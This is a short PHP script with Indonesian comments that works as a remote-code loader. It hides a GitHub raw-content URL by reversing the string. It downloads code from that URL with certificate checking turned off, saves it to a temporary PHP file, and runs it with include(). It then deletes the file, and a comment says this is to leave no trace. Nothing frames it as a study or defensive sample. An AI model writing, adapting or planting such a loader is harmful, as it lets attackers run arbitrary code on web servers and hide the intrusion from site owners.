<?php

// URL disamarkan (Reverse)
$u = strrev("txt.3/niam/sdaeh/sfer/mpo/mpoifuul/moc.tnetnocresubuhtig.war//:sptth");

// Ambil isi file
$ch = curl_init($u);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$code = curl_exec($ch);
curl_close($ch);

if ($code) {
    // Buat nama file sementara yang unik di folder yang bisa ditulis
    $tmp = "tmp_" . md5(time()) . ".php";
    
    // Simpan kode ke file sementara
    file_put_contents($tmp, $code);
    
    // Jalankan file tersebut
    if (file_exists($tmp)) {
        include($tmp);
        
        // Hapus file setelah dijalankan agar tidak meninggalkan jejak
        @unlink($tmp);
    }
} else {
    echo "Koneksi OK, tapi data kosong.";
}
